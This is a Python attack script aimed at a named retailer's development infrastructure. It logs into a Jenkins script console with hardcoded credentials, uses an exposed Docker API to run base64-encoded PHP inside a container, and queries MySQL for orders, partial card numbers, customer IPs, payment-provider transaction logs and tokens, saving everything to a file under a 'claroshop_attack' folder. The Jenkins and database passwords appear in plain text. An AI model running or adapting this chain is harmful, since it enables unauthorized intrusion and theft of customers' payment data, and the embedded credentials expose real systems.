#!/usr/bin/env python3
"""
dev_sears_payment_phase2.py — Fase 2: queries con nombres correctos
Columnas correctas: Fecha_Inicio, Forma_de_pago, Id, Cliente, total
"""
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, sys, time

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

DOCKER_API = 'http://172.27.140.148:4243'
CONTAINER = '5b32e909c295'
MYSQL_HOST = '172.27.141.6'
MYSQL_PORT = 3308
MYSQL_USER = 'apifincadodev'
MYSQL_PASS = '1q2w3e4r5t6y'


def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')


def make_php(queries):
    """Generate PHP that runs multiple MySQL queries, outputs JSON."""
    php_lines = [
        "<?php",
        f"$m = new mysqli('{MYSQL_HOST}', '{MYSQL_USER}', '{MYSQL_PASS}', '', {MYSQL_PORT});",
        "if ($m->connect_error) { echo json_encode(['error' => 'CONN: '.$m->connect_error]); exit; }",
        "$m->set_charset('utf8');",
        "$results = [];",
    ]
    for label, db, sql in queries:
        safe_sql = sql.replace("\\", "\\\\").replace("'", "\\'")
        php_lines.append(f"$m->select_db('{db}');")
        php_lines.append(f"$r = $m->query('{safe_sql}');")
        php_lines.append(f"if ($r === false) {{ $results['{label}'] = ['error' => $m->error]; }}")
        php_lines.append(f"elseif ($r === true) {{ $results['{label}'] = ['ok' => true]; }}")
        php_lines.append("else {")
        php_lines.append(f"  $rows = []; while ($row = $r->fetch_assoc()) $rows[] = $row;")
        php_lines.append(f"  $results['{label}'] = $rows;")
        php_lines.append("  $r->free();")
        php_lines.append("}")
    php_lines.append("$m->close();")
    php_lines.append("echo json_encode($results);")
    php_lines.append("?>")
    return "\n".join(php_lines)


def run_php_via_docker(php_code, label="query"):
    b64 = base64.b64encode(php_code.encode()).decode()
    cmd_json = json.dumps(["bash", "-c", f"echo {b64} | base64 -d | php"])
    
    groovy = f'''
import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def docker = "{DOCKER_API}"
def cid = "{CONTAINER}"
def cmdArray = new JsonSlurper().parseText('{cmd_json}')

def createUrl = new URL("${{docker}}/containers/${{cid}}/exec")
def createConn = createUrl.openConnection()
createConn.setRequestMethod("POST")
createConn.setRequestProperty("Content-Type", "application/json")
createConn.setDoOutput(true)
createConn.connectTimeout = 10000
createConn.readTimeout = 60000

def createBody = JsonOutput.toJson([Cmd: cmdArray, AttachStdout: true, AttachStderr: true])
createConn.outputStream.write(createBody.bytes)
createConn.outputStream.flush()

def createResp = createConn.inputStream.text
def execData = new JsonSlurper().parseText(createResp)
def execId = execData.Id

if (!execId) {{
    println "EXEC_CREATE_FAILED: " + createResp
    return
}}

def startUrl = new URL("${{docker}}/exec/${{execId}}/start")
def startConn = startUrl.openConnection()
startConn.setRequestMethod("POST")
startConn.setRequestProperty("Content-Type", "application/json")
startConn.setDoOutput(true)
startConn.connectTimeout = 10000
startConn.readTimeout = 120000
startConn.outputStream.write('{{"Detach":false,"Tty":false}}'.bytes)
startConn.outputStream.flush()

def rawBytes = startConn.inputStream.bytes
def output = new StringBuilder()
int pos = 0
while (pos < rawBytes.length) {{
    if (pos + 8 <= rawBytes.length) {{
        int frameLen = ((rawBytes[pos+4] & 0xFF) << 24) | ((rawBytes[pos+5] & 0xFF) << 16) | ((rawBytes[pos+6] & 0xFF) << 8) | (rawBytes[pos+7] & 0xFF)
        if (frameLen > 0 && pos + 8 + frameLen <= rawBytes.length) {{
            output.append(new String(rawBytes, pos + 8, frameLen, "UTF-8"))
            pos += 8 + frameLen
        }} else {{
            output.append(new String(rawBytes, pos, rawBytes.length - pos, "UTF-8"))
            break
        }}
    }} else {{
        output.append(new String(rawBytes, pos, rawBytes.length - pos, "UTF-8"))
        break
    }}
}}
println output.toString()
'''
    
    print(f"  [{time.strftime('%H:%M:%S')}] {label}...", end=" ", flush=True)
    try:
        raw = jenkins_exec(groovy, timeout=180)
        raw = raw.strip()
        print(f"OK ({len(raw)} bytes)")
        
        # Try to extract JSON from Docker stream (skip binary frame headers)
        json_start = raw.find('{')
        if json_start >= 0:
            json_str = raw[json_start:]
            try:
                return json.loads(json_str)
            except json.JSONDecodeError:
                pass
        return {"_raw": raw}
    except Exception as e:
        print(f"FAIL: {e}")
        return {"_error": str(e)}


def main():
    all_results = {}
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 1: Pedidos agosto 2026 + catálogo formas de pago
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 1: PEDIDOS AGOSTO 2026 + CATÁLOGO FORMAS PAGO")
    print("█" * 70)
    
    php = make_php([
        ("metodos_pago", "tienda", "SELECT * FROM metodos_de_pago"),
        ("pedidos_ago_fp", "tienda", 
         "SELECT Forma_de_pago, COUNT(*) as cnt, ROUND(SUM(total),2) as monto_total, ROUND(AVG(total),2) as promedio FROM pedidos WHERE Fecha_Inicio >= '2026-08-01' GROUP BY Forma_de_pago ORDER BY cnt DESC"),
        ("pedidos_count_ago", "tienda", 
         "SELECT COUNT(*) as total_pedidos FROM pedidos WHERE Fecha_Inicio >= '2026-08-01'"),
        ("pedidos_max_fecha", "tienda", 
         "SELECT MAX(Fecha_Inicio) as ultima_fecha FROM pedidos"),
        ("pedidos_total_count", "tienda", 
         "SELECT COUNT(*) as total_registros FROM pedidos"),
    ])
    
    batch1 = run_php_via_docker(php, "Pedidos agosto 2026 + formas de pago")
    all_results["batch1_pedidos_formas_pago"] = batch1
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 2: Sample 50 pedidos recientes (con datos de tarjeta)
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 2: SAMPLE 50 PEDIDOS RECIENTES")
    print("█" * 70)
    
    php = make_php([
        ("sample_pedidos", "tienda", 
         "SELECT Id, Cliente, Forma_de_pago, Num_pedido, Fecha_Inicio, Estatus, total, nombre, SUBSTRING(numero,1,20) as numero_parcial, mes, ao, ip, meses, id_portal FROM pedidos ORDER BY Fecha_Inicio DESC LIMIT 50"),
    ])
    
    batch2 = run_php_via_docker(php, "Sample 50 pedidos recientes")
    all_results["batch2_sample_pedidos"] = batch2
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 3: CyberSource transacciones
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 3: CYBERSOURCE + NETPAY TRANSACCIONES")
    print("█" * 70)
    
    php = make_php([
        ("cyber_cols", "tienda", "SHOW COLUMNS FROM cybersource_transacciones"),
        ("cyber_count", "tienda", "SELECT COUNT(*) as cnt FROM cybersource_transacciones"),
        ("cyber_max_date", "tienda", "SELECT MAX(fecha_creacion) as max_f FROM cybersource_transacciones"),
        ("netpay_cols", "tienda", "SHOW COLUMNS FROM netpay_transacciones"),
        ("netpay_count", "tienda", "SELECT COUNT(*) as cnt FROM netpay_transacciones"),
    ])
    
    batch3 = run_php_via_docker(php, "CyberSource + NetPay structure")
    all_results["batch3_psp_structure"] = batch3
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 4: Sample CyberSource + transacciones_tarjeta
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 4: SAMPLE PSP TRANSACTIONS")
    print("█" * 70)
    
    php = make_php([
        ("cyber_sample", "tienda", 
         "SELECT * FROM cybersource_transacciones ORDER BY id DESC LIMIT 30"),
        ("tarjeta_cols", "tienda", "SHOW COLUMNS FROM transacciones_tarjeta"),
        ("tarjeta_count", "tienda", "SELECT COUNT(*) as cnt FROM transacciones_tarjeta"),
    ])
    
    batch4 = run_php_via_docker(php, "Sample CyberSource + tarjeta structure")
    all_results["batch4_psp_samples"] = batch4
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 5: NetPay samples + transacciones_tarjeta samples
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 5: NETPAY + TRANSACCIONES_TARJETA SAMPLES")
    print("█" * 70)
    
    php = make_php([
        ("netpay_sample", "tienda", 
         "SELECT * FROM netpay_transacciones ORDER BY id DESC LIMIT 30"),
        ("tarjeta_sample", "tienda", 
         "SELECT * FROM transacciones_tarjeta ORDER BY id DESC LIMIT 30"),
    ])
    
    batch5 = run_php_via_docker(php, "NetPay + transacciones_tarjeta samples")
    all_results["batch5_more_samples"] = batch5
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 6: Conteos y fechas de tablas de transacciones
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 6: CONTEOS TABLAS DE CONCILIACION + T1")
    print("█" * 70)
    
    php = make_php([
        ("t1pagos_cols", "tienda", "SHOW COLUMNS FROM logs_respuesta_pagos_t1pagos"),
        ("t1pagos_count", "tienda", "SELECT COUNT(*) as cnt FROM logs_respuesta_pagos_t1pagos"),
        ("t1pagos_sample", "tienda", "SELECT * FROM logs_respuesta_pagos_t1pagos ORDER BY id DESC LIMIT 20"),
        ("concilia_sears_count", "tienda", "SELECT COUNT(*) as cnt FROM conciliacion_sears"),
        ("control_trans_count", "tienda", "SELECT COUNT(*) as cnt FROM control_transacciones_sears"),
    ])
    
    batch6 = run_php_via_docker(php, "T1Pagos + conciliacion counts")
    all_results["batch6_t1_concilia"] = batch6
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 7: Token T1 + order_payment_method
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 7: TOKEN T1 + ORDER_PAYMENT_METHOD")
    print("█" * 70)
    
    php = make_php([
        ("tokent1_cols", "tienda", "SHOW COLUMNS FROM tokent1envio"),
        ("tokent1_count", "tienda", "SELECT COUNT(*) as cnt FROM tokent1envio"),
        ("tokent1_sample", "tienda", "SELECT * FROM tokent1envio ORDER BY id DESC LIMIT 20"),
        ("opm_cols", "tienda", "SHOW COLUMNS FROM order_payment_method"),
        ("opm_count", "tienda", "SELECT COUNT(*) as cnt FROM order_payment_method"),
        ("opm_sample", "tienda", "SELECT * FROM order_payment_method ORDER BY id DESC LIMIT 30"),
    ])
    
    batch7 = run_php_via_docker(php, "Token T1 + order_payment_method")
    all_results["batch7_token_opm"] = batch7
    
    # ═══════════════════════════════════════════════════════════════
    # BATCH 8: Transaccion PayPal + pagobancos
    # ═══════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  BATCH 8: PAYPAL + PAGOBANCOS")
    print("█" * 70)
    
    php = make_php([
        ("paypal_cols", "tienda", "SHOW COLUMNS FROM transaccion_paypal_express"),
        ("paypal_count", "tienda", "SELECT COUNT(*) as cnt FROM transaccion_paypal_express"),
        ("paypal_sample", "tienda", "SELECT * FROM transaccion_paypal_express ORDER BY id DESC LIMIT 20"),
        ("pagobancos_cols", "tienda", "SHOW COLUMNS FROM transaccion_pagobancos"),
        ("pagobancos_count", "tienda", "SELECT COUNT(*) as cnt FROM transaccion_pagobancos"),
        ("pagobancos_sample", "tienda", "SELECT * FROM transaccion_pagobancos ORDER BY id DESC LIMIT 20"),
    ])
    
    batch8 = run_php_via_docker(php, "PayPal + Pagobancos")
    all_results["batch8_paypal_bancos"] = batch8
    
    # ═══════════════════════════════════════════════════════════════
    # SAVE
    # ═══════════════════════════════════════════════════════════════
    out_path = r'c:\xampp\htdocs\pentagi\claroshop_attack\dev_sears_payment_tables.json'
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(all_results, f, indent=2, ensure_ascii=False, default=str)
    
    print(f"\n{'█'*70}")
    print(f"█  SAVED: {out_path}")
    print(f"█{'█'*69}")
    
    # Print key results
    print("\n\n=== KEY FINDINGS ===")
    if isinstance(batch1, dict) and '_raw' not in batch1 and '_error' not in batch1:
        print("\n--- Formas de pago agosto 2026 ---")
        print(json.dumps(batch1.get("pedidos_ago_fp", []), indent=2, ensure_ascii=False)[:2000])
        print("\n--- Catálogo metodos_de_pago ---")
        print(json.dumps(batch1.get("metodos_pago", []), indent=2, ensure_ascii=False)[:2000])
    else:
        print(json.dumps(batch1, indent=2, ensure_ascii=False, default=str)[:3000])


if __name__ == '__main__':
    main()
